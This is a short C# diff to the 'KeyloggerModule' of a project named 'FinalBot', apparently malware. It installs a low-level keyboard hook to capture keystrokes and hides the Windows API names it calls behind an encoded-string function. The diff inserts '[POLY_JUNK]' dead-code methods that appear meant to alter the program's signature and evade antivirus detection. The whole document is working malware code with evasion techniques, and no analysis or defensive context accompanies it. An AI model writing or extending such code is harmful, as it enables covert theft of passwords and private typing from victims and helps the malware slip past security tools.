@@ -6,6 +6,12 @@ namespace FinalBot.Modules
 {
     public static class KeyloggerModule
     {
+        // [POLY_JUNK]
+        private static void _vanguard_c59d3eb1() {
+            int val = 56295;
+            if (val > 50000) Console.WriteLine("Hash:" + 56295);
+        }
+
         private const int _hType = 13; // WH_KEYBOARD_LL
         private const int _kDown = 0x0100; // WM_KEYDOWN
         private static LkProc _cb = HookCallback;
@@ -15,6 +21,12 @@ namespace FinalBot.Modules
 
         private static class Native
         {
+        // [POLY_JUNK]
+        private static void _vanguard_c59d3eb1() {
+            int val = 56295;
+            if (val > 50000) Console.WriteLine("Hash:" + 56295);
+        }
+
             public static SetHookDelegate SetHook => VanguardCore.SafetyManager.ApiInterface.GetUser32<SetHookDelegate>(DAP("PbsVikdlvpHllkBu"));
             public static UnhookDelegate Unhook => VanguardCore.SafetyManager.ApiInterface.GetUser32<UnhookDelegate>(DAP("NkhllkVikdlvpHllkBu"));
             public static CallNextDelegate CallNext => VanguardCore.SafetyManager.ApiInterface.GetUser32<CallNextDelegate>(DAP("`niisBuqHllkBu"));
